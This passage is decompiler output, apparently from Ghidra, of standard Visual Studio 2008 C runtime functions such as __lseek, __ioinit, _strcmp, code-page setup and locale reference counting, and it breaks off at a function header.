// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __lseek
// 
// Library: Visual Studio 2008 Release

long __cdecl __lseek(int _FileHandle,long _Offset,int _Origin)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  long local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0046eb20)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_0046eb40)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_0046eb40)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __lseek_nolock(_FileHandle,_Offset,_Origin);
        }
        FUN_004163c5();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_004163c5(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __ioinit
// 
// Library: Visual Studio 2008 Release

int __cdecl __ioinit(void)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  DWORD DVar3;
  BOOL BVar4;
  HANDLE pvVar5;
  UINT *pUVar6;
  int iVar7;
  HANDLE *ppvVar8;
  UINT UVar9;
  UINT UVar10;
  _STARTUPINFOA local_68;
  uint local_24;
  HANDLE *local_20;
  undefined4 uStack_c;
  undefined4 local_8;
  
  uStack_c = 0x4163db;
  local_8 = 0;
  GetStartupInfoA(&local_68);
  local_8 = 0xfffffffe;
  puVar2 = (undefined4 *)__calloc_crt(0x20,0x40);
  if (puVar2 == (undefined4 *)0x0) {
LAB_0041661a:
    iVar7 = -1;
  }
  else {
    DAT_0046eb20 = 0x20;
    DAT_0046eb40 = puVar2;
    for (; puVar2 < DAT_0046eb40 + 0x200; puVar2 = puVar2 + 0x10) {
      *(undefined *)(puVar2 + 1) = 0;
      *puVar2 = 0xffffffff;
      *(undefined *)((int)puVar2 + 5) = 10;
      puVar2[2] = 0;
      *(undefined *)(puVar2 + 9) = 0;
      *(undefined *)((int)puVar2 + 0x25) = 10;
      *(undefined *)((int)puVar2 + 0x26) = 10;
      puVar2[0xe] = 0;
      *(undefined *)(puVar2 + 0xd) = 0;
    }
    if ((local_68.cbReserved2 != 0) && ((UINT *)local_68.lpReserved2 != (UINT *)0x0)) {
      UVar9 = *(UINT *)local_68.lpReserved2;
      pUVar6 = (UINT *)((int)local_68.lpReserved2 + 4);
      local_20 = (HANDLE *)((int)pUVar6 + UVar9);
      if (0x7ff < (int)UVar9) {
        UVar9 = 0x800;
      }
      local_24 = 1;
      while ((UVar10 = UVar9, (int)DAT_0046eb20 < (int)UVar9 &&
             (puVar2 = (undefined4 *)__calloc_crt(0x20,0x40), UVar10 = DAT_0046eb20,
             puVar2 != (undefined4 *)0x0))) {
        (&DAT_0046eb40)[local_24] = puVar2;
        DAT_0046eb20 = DAT_0046eb20 + 0x20;
        puVar1 = puVar2;
        for (; puVar2 < puVar1 + 0x200; puVar2 = puVar2 + 0x10) {
          *(undefined *)(puVar2 + 1) = 0;
          *puVar2 = 0xffffffff;
          *(undefined *)((int)puVar2 + 5) = 10;
          puVar2[2] = 0;
          *(byte *)(puVar2 + 9) = *(byte *)(puVar2 + 9) & 0x80;
          *(undefined *)((int)puVar2 + 0x25) = 10;
          *(undefined *)((int)puVar2 + 0x26) = 10;
          puVar2[0xe] = 0;
          *(undefined *)(puVar2 + 0xd) = 0;
          puVar1 = (&DAT_0046eb40)[local_24];
        }
        local_24 = local_24 + 1;
      }
      local_24 = 0;
      if (0 < (int)UVar10) {
        do {
          pvVar5 = *local_20;
          if ((((pvVar5 != (HANDLE)0xffffffff) && (pvVar5 != (HANDLE)0xfffffffe)) &&
              ((*(byte *)pUVar6 & 1) != 0)) &&
             (((*(byte *)pUVar6 & 8) != 0 || (DVar3 = GetFileType(pvVar5), DVar3 != 0)))) {
            ppvVar8 = (HANDLE *)
                      ((local_24 & 0x1f) * 0x40 + (int)(&DAT_0046eb40)[(int)local_24 >> 5]);
            *ppvVar8 = *local_20;
            *(byte *)(ppvVar8 + 1) = *(byte *)pUVar6;
            BVar4 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(ppvVar8 + 3),4000);
            if (BVar4 == 0) goto LAB_0041661a;
            ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
          }
          local_24 = local_24 + 1;
          pUVar6 = (UINT *)((int)pUVar6 + 1);
          local_20 = local_20 + 1;
        } while ((int)local_24 < (int)UVar10);
      }
    }
    iVar7 = 0;
    do {
      ppvVar8 = (HANDLE *)(DAT_0046eb40 + iVar7 * 0x10);
      if ((*ppvVar8 == (HANDLE)0xffffffff) || (*ppvVar8 == (HANDLE)0xfffffffe)) {
        *(undefined *)(ppvVar8 + 1) = 0x81;
        if (iVar7 == 0) {
          DVar3 = 0xfffffff6;
        }
        else {
          DVar3 = 0xfffffff5 - (iVar7 != 1);
        }
        pvVar5 = GetStdHandle(DVar3);
        if (((pvVar5 == (HANDLE)0xffffffff) || (pvVar5 == (HANDLE)0x0)) ||
           (DVar3 = GetFileType(pvVar5), DVar3 == 0)) {
          *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x40;
          *ppvVar8 = (HANDLE)0xfffffffe;
        }
        else {
          *ppvVar8 = pvVar5;
          if ((DVar3 & 0xff) == 2) {
            *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x40;
          }
          else if ((DVar3 & 0xff) == 3) {
            *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 8;
          }
          BVar4 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(ppvVar8 + 3),4000);
          if (BVar4 == 0) goto LAB_0041661a;
          ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
        }
      }
      else {
        *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x80;
      }
      iVar7 = iVar7 + 1;
    } while (iVar7 < 3);
    SetHandleCount(DAT_0046eb20);
    iVar7 = 0;
  }
  return iVar7;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  private: static void __cdecl type_info::_Type_info_dtor(class type_info *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl type_info::_Type_info_dtor(type_info *param_1)

{
  int *_Memory;
  int *piVar1;
  int *piVar2;
  
  __lock(0xe);
  _Memory = DAT_0042d898;
  if (*(int *)(param_1 + 4) != 0) {
    piVar1 = (int *)&DAT_0042d894;
    do {
      piVar2 = piVar1;
      if (DAT_0042d898 == (int *)0x0) goto LAB_00416667;
      piVar1 = DAT_0042d898;
    } while (*DAT_0042d898 != *(int *)(param_1 + 4));
    piVar2[1] = DAT_0042d898[1];
    _free(_Memory);
LAB_00416667:
    _free(*(void **)(param_1 + 4));
    *(undefined4 *)(param_1 + 4) = 0;
  }
  FUN_0041668a();
  return;
}



void FUN_0041668a(void)

{
  FUN_00412cbf(0xe);
  return;
}



// Library Function - Single Match
//  _strcmp
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _strcmp(char *_Str1,char *_Str2)

{
  undefined2 uVar1;
  undefined4 uVar2;
  byte bVar3;
  byte bVar4;
  bool bVar5;
  
  if (((uint)_Str1 & 3) != 0) {
    if (((uint)_Str1 & 1) != 0) {
      bVar4 = *_Str1;
      _Str1 = _Str1 + 1;
      bVar5 = bVar4 < (byte)*_Str2;
      if (bVar4 != *_Str2) goto LAB_004166e4;
      _Str2 = _Str2 + 1;
      if (bVar4 == 0) {
        return 0;
      }
      if (((uint)_Str1 & 2) == 0) goto LAB_004166b0;
    }
    uVar1 = *(undefined2 *)_Str1;
    _Str1 = (char *)((int)_Str1 + 2);
    bVar4 = (byte)uVar1;
    bVar5 = bVar4 < (byte)*_Str2;
    if (bVar4 != *_Str2) goto LAB_004166e4;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((ushort)uVar1 >> 8);
    bVar5 = bVar4 < ((byte *)_Str2)[1];
    if (bVar4 != ((byte *)_Str2)[1]) goto LAB_004166e4;
    if (bVar4 == 0) {
      return 0;
    }
    _Str2 = (char *)((byte *)_Str2 + 2);
  }
LAB_004166b0:
  while( true ) {
    uVar2 = *(undefined4 *)_Str1;
    bVar4 = (byte)uVar2;
    bVar5 = bVar4 < (byte)*_Str2;
    if (bVar4 != *_Str2) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 8);
    bVar5 = bVar4 < ((byte *)_Str2)[1];
    if (bVar4 != ((byte *)_Str2)[1]) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 0x10);
    bVar5 = bVar4 < ((byte *)_Str2)[2];
    if (bVar4 != ((byte *)_Str2)[2]) break;
    bVar3 = (byte)((uint)uVar2 >> 0x18);
    if (bVar4 == 0) {
      return 0;
    }
    bVar5 = bVar3 < ((byte *)_Str2)[3];
    if (bVar3 != ((byte *)_Str2)[3]) break;
    _Str2 = (char *)((byte *)_Str2 + 4);
    _Str1 = (char *)((int)_Str1 + 4);
    if (bVar3 == 0) {
      return 0;
    }
  }
LAB_004166e4:
  return (uint)bVar5 * -2 + 1;
}



// Library Function - Single Match
//  int __cdecl CPtoLCID(int)
// 
// Library: Visual Studio 2008 Release

int __cdecl CPtoLCID(int param_1)

{
  int in_EAX;
  
  if (in_EAX == 0x3a4) {
    return 0x411;
  }
  if (in_EAX == 0x3a8) {
    return 0x804;
  }
  if (in_EAX == 0x3b5) {
    return 0x412;
  }
  if (in_EAX != 0x3b6) {
    return 0;
  }
  return 0x404;
}



// Library Function - Single Match
//  void __cdecl setSBCS(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2008 Release

void __cdecl setSBCS(threadmbcinfostruct *param_1)

{
  int in_EAX;
  undefined *puVar1;
  int iVar2;
  
  _memset((void *)(in_EAX + 0x1c),0,0x101);
  *(undefined4 *)(in_EAX + 4) = 0;
  *(undefined4 *)(in_EAX + 8) = 0;
  *(undefined4 *)(in_EAX + 0xc) = 0;
  *(undefined4 *)(in_EAX + 0x10) = 0;
  *(undefined4 *)(in_EAX + 0x14) = 0;
  *(undefined4 *)(in_EAX + 0x18) = 0;
  puVar1 = (undefined *)(in_EAX + 0x1c);
  iVar2 = 0x101;
  do {
    *puVar1 = puVar1[(int)&DAT_0042b7e0 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  puVar1 = (undefined *)(in_EAX + 0x11d);
  iVar2 = 0x100;
  do {
    *puVar1 = puVar1[(int)&DAT_0042b7e0 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  return;
}



// Library Function - Single Match
//  void __cdecl setSBUpLow(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2008 Release

void __cdecl setSBUpLow(threadmbcinfostruct *param_1)

{
  byte *pbVar1;
  char *pcVar2;
  BOOL BVar3;
  uint uVar4;
  CHAR CVar5;
  char cVar6;
  BYTE *pBVar7;
  int unaff_ESI;
  _cpinfo local_51c;
  WORD local_508 [256];
  CHAR local_308 [256];
  CHAR local_208 [256];
  CHAR local_108 [256];
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  BVar3 = GetCPInfo(*(UINT *)(unaff_ESI + 4),&local_51c);
  if (BVar3 == 0) {
    uVar4 = 0;
    do {
      pcVar2 = (char *)(unaff_ESI + 0x11d + uVar4);
      if (pcVar2 + (-0x61 - (unaff_ESI + 0x11d)) + 0x20 < (char *)0x1a) {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        cVar6 = (char)uVar4 + ' ';
LAB_00416934:
        *pcVar2 = cVar6;
      }
      else {
        if (pcVar2 + (-0x61 - (unaff_ESI + 0x11d)) < (char *)0x1a) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          cVar6 = (char)uVar4 + -0x20;
          goto LAB_00416934;
        }
        *pcVar2 = '\0';
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  else {
    uVar4 = 0;
    do {
      local_108[uVar4] = (CHAR)uVar4;
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
    local_108[0] = ' ';
    if (local_51c.LeadByte[0] != 0) {
      pBVar7 = local_51c.LeadByte + 1;
      do {
        uVar4 = (uint)local_51c.LeadByte[0];
        if (uVar4 <= *pBVar7) {
          _memset(local_108 + uVar4,0x20,(*pBVar7 - uVar4) + 1);
        }
        local_51c.LeadByte[0] = pBVar7[1];
        pBVar7 = pBVar7 + 2;
      } while (local_51c.LeadByte[0] != 0);
    }
    ___crtGetStringTypeA
              ((_locale_t)0x0,1,local_108,0x100,local_508,*(int *)(unaff_ESI + 4),
               *(BOOL *)(unaff_ESI + 0xc));
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x100,local_108,0x100,local_208,
                       0x100,*(int *)(unaff_ESI + 4),0);
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x200,local_108,0x100,local_308,
                       0x100,*(int *)(unaff_ESI + 4),0);
    uVar4 = 0;
    do {
      if ((local_508[uVar4] & 1) == 0) {
        if ((local_508[uVar4] & 2) != 0) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          CVar5 = local_308[uVar4];
          goto LAB_004168d2;
        }
        *(undefined *)(unaff_ESI + 0x11d + uVar4) = 0;
      }
      else {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        CVar5 = local_208[uVar4];
LAB_004168d2:
        *(CHAR *)(unaff_ESI + 0x11d + uVar4) = CVar5;
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetmbcinfo
// 
// Library: Visual Studio 2008 Release

pthreadmbcinfo __cdecl ___updatetmbcinfo(void)

{
  _ptiddata p_Var1;
  LONG LVar2;
  pthreadmbcinfo lpAddend;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_0042bd04) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xd);
    lpAddend = p_Var1->ptmbcinfo;
    if (lpAddend != (pthreadmbcinfo)PTR_DAT_0042bc08) {
      if (lpAddend != (pthreadmbcinfo)0x0) {
        LVar2 = InterlockedDecrement(&lpAddend->refcount);
        if ((LVar2 == 0) && (lpAddend != (pthreadmbcinfo)&DAT_0042b7e0)) {
          _free(lpAddend);
        }
      }
      p_Var1->ptmbcinfo = (pthreadmbcinfo)PTR_DAT_0042bc08;
      lpAddend = (pthreadmbcinfo)PTR_DAT_0042bc08;
      InterlockedIncrement((LONG *)PTR_DAT_0042bc08);
    }
    FUN_004169e9();
  }
  else {
    lpAddend = p_Var1->ptmbcinfo;
  }
  if (lpAddend == (pthreadmbcinfo)0x0) {
    __amsg_exit(0x20);
  }
  return lpAddend;
}



void FUN_004169e9(void)

{
  FUN_00412cbf(0xd);
  return;
}



// Library Function - Single Match
//  int __cdecl getSystemCP(int)
// 
// Library: Visual Studio 2008 Release

int __cdecl getSystemCP(int param_1)

{
  UINT UVar1;
  int unaff_ESI;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,(localeinfo_struct *)0x0);
  DAT_0042d89c = 0;
  if (unaff_ESI == -2) {
    DAT_0042d89c = 1;
    UVar1 = GetOEMCP();
  }
  else if (unaff_ESI == -3) {
    DAT_0042d89c = 1;
    UVar1 = GetACP();
  }
  else {
    if (unaff_ESI != -4) {
      if (local_8 == '\0') {
        DAT_0042d89c = 0;
        return unaff_ESI;
      }
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      return unaff_ESI;
    }
    UVar1 = *(UINT *)(local_14[0] + 4);
    DAT_0042d89c = 1;
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return UVar1;
}



// Library Function - Single Match
//  __setmbcp_nolock
// 
// Library: Visual Studio 2008 Release

void __cdecl __setmbcp_nolock(undefined4 param_1,int param_2)

{
  BYTE *pBVar1;
  byte *pbVar2;
  byte bVar3;
  uint uVar4;
  uint uVar5;
  BOOL BVar6;
  undefined2 *puVar7;
  byte *pbVar8;
  int extraout_ECX;
  undefined2 *puVar9;
  int iVar10;
  undefined4 extraout_EDX;
  BYTE *pBVar11;
  threadmbcinfostruct *unaff_EDI;
  uint local_24;
  byte *local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  uVar4 = getSystemCP((int)unaff_EDI);
  if (uVar4 != 0) {
    local_20 = (byte *)0x0;
    uVar5 = 0;
LAB_00416aac:
    if (*(uint *)((int)&DAT_0042bc10 + uVar5) != uVar4) goto code_r0x00416ab8;
    _memset((void *)(param_2 + 0x1c),0,0x101);
    local_24 = 0;
    pbVar8 = &DAT_0042bc20 + (int)local_20 * 0x30;
    local_20 = pbVar8;
    do {
      for (; (*pbVar8 != 0 && (bVar3 = pbVar8[1], bVar3 != 0)); pbVar8 = pbVar8 + 2) {
        for (uVar5 = (uint)*pbVar8; uVar5 <= bVar3; uVar5 = uVar5 + 1) {
          pbVar2 = (byte *)(param_2 + 0x1d + uVar5);
          *pbVar2 = *pbVar2 | (&DAT_0042bc0c)[local_24];
          bVar3 = pbVar8[1];
        }
      }
      local_24 = local_24 + 1;
      pbVar8 = local_20 + 8;
      local_20 = pbVar8;
    } while (local_24 < 4);
    *(uint *)(param_2 + 4) = uVar4;
    *(undefined4 *)(param_2 + 8) = 1;
    iVar10 = CPtoLCID((int)unaff_EDI);
    *(int *)(param_2 + 0xc) = iVar10;
    puVar7 = (undefined2 *)(param_2 + 0x10);
    puVar9 = (undefined2 *)(&DAT_0042bc14 + extraout_ECX);
    iVar10 = 6;
    do {
      *puVar7 = *puVar9;
      puVar9 = puVar9 + 1;
      puVar7 = puVar7 + 1;
      iVar10 = iVar10 + -1;
    } while (iVar10 != 0);
    goto LAB_00416bdd;
  }
LAB_00416a99:
  setSBCS(unaff_EDI);
LAB_00416c44:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
code_r0x00416ab8:
  local_20 = (byte *)((int)local_20 + 1);
  uVar5 = uVar5 + 0x30;
  if (0xef < uVar5) goto code_r0x00416ac5;
  goto LAB_00416aac;
code_r0x00416ac5:
  if (((uVar4 == 65000) || (uVar4 == 0xfde9)) ||
     (BVar6 = IsValidCodePage(uVar4 & 0xffff), BVar6 == 0)) goto LAB_00416c44;
  BVar6 = GetCPInfo(uVar4,&local_1c);
  if (BVar6 != 0) {
    _memset((void *)(param_2 + 0x1c),0,0x101);
    *(uint *)(param_2 + 4) = uVar4;
    *(undefined4 *)(param_2 + 0xc) = 0;
    if (local_1c.MaxCharSize < 2) {
      *(undefined4 *)(param_2 + 8) = 0;
    }
    else {
      if (local_1c.LeadByte[0] != '\0') {
        pBVar11 = local_1c.LeadByte + 1;
        do {
          bVar3 = *pBVar11;
          if (bVar3 == 0) break;
          for (uVar4 = (uint)pBVar11[-1]; uVar4 <= bVar3; uVar4 = uVar4 + 1) {
            pbVar8 = (byte *)(param_2 + 0x1d + uVar4);
            *pbVar8 = *pbVar8 | 4;
          }
          pBVar1 = pBVar11 + 1;
          pBVar11 = pBVar11 + 2;
        } while (*pBVar1 != 0);
      }
      pbVar8 = (byte *)(param_2 + 0x1e);
      iVar10 = 0xfe;
      do {
        *pbVar8 = *pbVar8 | 8;
        pbVar8 = pbVar8 + 1;
        iVar10 = iVar10 + -1;
      } while (iVar10 != 0);
      iVar10 = CPtoLCID((int)unaff_EDI);
      *(int *)(param_2 + 0xc) = iVar10;
      *(undefined4 *)(param_2 + 8) = extraout_EDX;
    }
    *(undefined4 *)(param_2 + 0x10) = 0;
    *(undefined4 *)(param_2 + 0x14) = 0;
    *(undefined4 *)(param_2 + 0x18) = 0;
LAB_00416bdd:
    setSBUpLow(unaff_EDI);
    goto LAB_00416c44;
  }
  if (DAT_0042d89c == 0) goto LAB_00416c44;
  goto LAB_00416a99;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int FUN_00416c53(undefined4 param_1)

{
  _ptiddata p_Var1;
  int iVar2;
  pthreadmbcinfo ptVar3;
  LONG LVar4;
  int *piVar5;
  int iVar6;
  pthreadmbcinfo ptVar7;
  pthreadmbcinfo ptVar8;
  int in_stack_ffffffc8;
  int local_24;
  
  local_24 = -1;
  p_Var1 = __getptd();
  ___updatetmbcinfo();
  ptVar3 = p_Var1->ptmbcinfo;
  iVar2 = getSystemCP(in_stack_ffffffc8);
  if (iVar2 == ptVar3->mbcodepage) {
    local_24 = 0;
  }
  else {
    ptVar3 = (pthreadmbcinfo)__malloc_crt(0x220);
    if (ptVar3 != (pthreadmbcinfo)0x0) {
      ptVar7 = p_Var1->ptmbcinfo;
      ptVar8 = ptVar3;
      for (iVar6 = 0x88; iVar6 != 0; iVar6 = iVar6 + -1) {
        ptVar8->refcount = ptVar7->refcount;
        ptVar7 = (pthreadmbcinfo)&ptVar7->mbcodepage;
        ptVar8 = (pthreadmbcinfo)&ptVar8->mbcodepage;
      }
      ptVar3->refcount = 0;
      local_24 = __setmbcp_nolock(iVar2,(int)ptVar3);
      if (local_24 == 0) {
        LVar4 = InterlockedDecrement(&p_Var1->ptmbcinfo->refcount);
        if ((LVar4 == 0) && (p_Var1->ptmbcinfo != (pthreadmbcinfo)&DAT_0042b7e0)) {
          _free(p_Var1->ptmbcinfo);
        }
        p_Var1->ptmbcinfo = ptVar3;
        InterlockedIncrement((LONG *)ptVar3);
        if (((*(byte *)&p_Var1->_ownlocale & 2) == 0) && (((byte)DAT_0042bd04 & 1) == 0)) {
          __lock(0xd);
          _DAT_0042d8ac = ptVar3->mbcodepage;
          _DAT_0042d8b0 = ptVar3->ismbcodepage;
          _DAT_0042d8b4 = *(undefined4 *)ptVar3->mbulinfo;
          for (iVar2 = 0; iVar2 < 5; iVar2 = iVar2 + 1) {
            (&DAT_0042d8a0)[iVar2] = ptVar3->mbulinfo[iVar2 + 2];
          }
          for (iVar2 = 0; iVar2 < 0x101; iVar2 = iVar2 + 1) {
            (&DAT_0042ba00)[iVar2] = ptVar3->mbctype[iVar2 + 4];
          }
          for (iVar2 = 0; iVar2 < 0x100; iVar2 = iVar2 + 1) {
            (&DAT_0042bb08)[iVar2] = ptVar3->mbcasemap[iVar2 + 4];
          }
          LVar4 = InterlockedDecrement((LONG *)PTR_DAT_0042bc08);
          if ((LVar4 == 0) && (PTR_DAT_0042bc08 != &DAT_0042b7e0)) {
            _free(PTR_DAT_0042bc08);
          }
          PTR_DAT_0042bc08 = (undefined *)ptVar3;
          InterlockedIncrement((LONG *)ptVar3);
          FUN_00416db4();
        }
      }
      else if (local_24 == -1) {
        if (ptVar3 != (pthreadmbcinfo)&DAT_0042b7e0) {
          _free(ptVar3);
        }
        piVar5 = __errno();
        *piVar5 = 0x16;
      }
    }
  }
  return local_24;
}



void FUN_00416db4(void)

{
  FUN_00412cbf(0xd);
  return;
}



// Library Function - Single Match
//  ___freetlocinfo
// 
// Library: Visual Studio 2008 Release

void __cdecl ___freetlocinfo(void *param_1)

{
  int *piVar1;
  undefined **ppuVar2;
  void *_Memory;
  int **ppiVar3;
  
  _Memory = param_1;
  if ((((*(undefined ***)((int)param_1 + 0xbc) != (undefined **)0x0) &&
       (*(undefined ***)((int)param_1 + 0xbc) != &PTR_DAT_0042bf58)) &&
      (*(int **)((int)param_1 + 0xb0) != (int *)0x0)) && (**(int **)((int)param_1 + 0xb0) == 0)) {
    piVar1 = *(int **)((int)param_1 + 0xb8);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_mon(*(int *)((int)param_1 + 0xbc));
    }
    piVar1 = *(int **)((int)param_1 + 0xb4);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_num(*(void ***)((int)param_1 + 0xbc));
    }
    _free(*(void **)((int)param_1 + 0xb0));
    _free(*(void **)((int)param_1 + 0xbc));
  }
  if ((*(int **)((int)param_1 + 0xc0) != (int *)0x0) && (**(int **)((int)param_1 + 0xc0) == 0)) {
    _free((void *)(*(int *)((int)param_1 + 0xc4) + -0xfe));
    _free((void *)(*(int *)((int)param_1 + 0xcc) + -0x80));
    _free((void *)(*(int *)((int)param_1 + 0xd0) + -0x80));
    _free(*(void **)((int)param_1 + 0xc0));
  }
  ppuVar2 = *(undefined ***)(void **)((int)param_1 + 0xd4);
  if ((ppuVar2 != &PTR_DAT_0042be98) && (ppuVar2[0x2d] == (undefined *)0x0)) {
    ___free_lc_time(ppuVar2);
    _free(*(void **)((int)param_1 + 0xd4));
  }
  ppiVar3 = (int **)((int)param_1 + 0x50);
  param_1 = (void *)0x6;
  do {
    if (((ppiVar3[-2] != (int *)&DAT_0042bd08) && (piVar1 = *ppiVar3, piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      _free(piVar1);
    }
    if (((ppiVar3[-1] != (int *)0x0) && (piVar1 = ppiVar3[1], piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      _free(piVar1);
    }
    ppiVar3 = ppiVar3 + 4;
    param_1 = (void *)((int)param_1 + -1);
  } while (param_1 != (void *)0x0);
  _free(_Memory);
  return;
}



// Library Function - Single Match
//  ___addlocaleref
// 
// Library: Visual Studio 2008 Release

void __cdecl ___addlocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  InterlockedIncrement(param_1);
  if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2c]);
  }
  if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2e]);
  }
  if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2d]);
  }
  if ((LONG *)param_1[0x30] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x30]);
  }
  ppLVar2 = (LONG **)(param_1 + 0x14);
  param_1 = (LONG *)0x6;
  do {
    if ((ppLVar2[-2] != (LONG *)&DAT_0042bd08) && (*ppLVar2 != (LONG *)0x0)) {
      InterlockedIncrement(*ppLVar2);
    }
    if ((ppLVar2[-1] != (LONG *)0x0) && (ppLVar2[1] != (LONG *)0x0)) {
      InterlockedIncrement(ppLVar2[1]);
    }
    ppLVar2 = ppLVar2 + 4;
    param_1 = (LONG *)((int)param_1 + -1);
  } while (param_1 != (LONG *)0x0);
  InterlockedIncrement((LONG *)(pLVar1[0x35] + 0xb4));
  return;
}



// Library Function - Single Match
//  ___removelocaleref
// 
// Library: Visual Studio 2008 Release

LONG * __cdecl ___removelocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  if (param_1 != (LONG *)0x0) {
    InterlockedDecrement(param_1);
    if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2c]);
    }
    if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2e]);
    }
    if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2d]);
    }
    if ((LONG *)param_1[0x30] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x30]);
    }
    ppLVar2 = (LONG **)(param_1 + 0x14);
    param_1 = (LONG *)0x6;
    do {
      if ((ppLVar2[-2] != (LONG *)&DAT_0042bd08) && (*ppLVar2 != (LONG *)0x0)) {
        InterlockedDecrement(*ppLVar2);
      }
      if ((ppLVar2[-1] != (LONG *)0x0) && (ppLVar2[1] != (LONG *)0x0)) {
        InterlockedDecrement(ppLVar2[1]);
      }
      ppLVar2 = ppLVar2 + 4;
      param_1 = (LONG *)((int)param_1 + -1);
    } while (param_1 != (LONG *)0x0);
    InterlockedDecrement((LONG *)(pLVar1[0x35] + 0xb4));
  }
  return pLVar1;
}



// Library Function - Single Match
//  __updatetlocinfoEx_nolock
// 
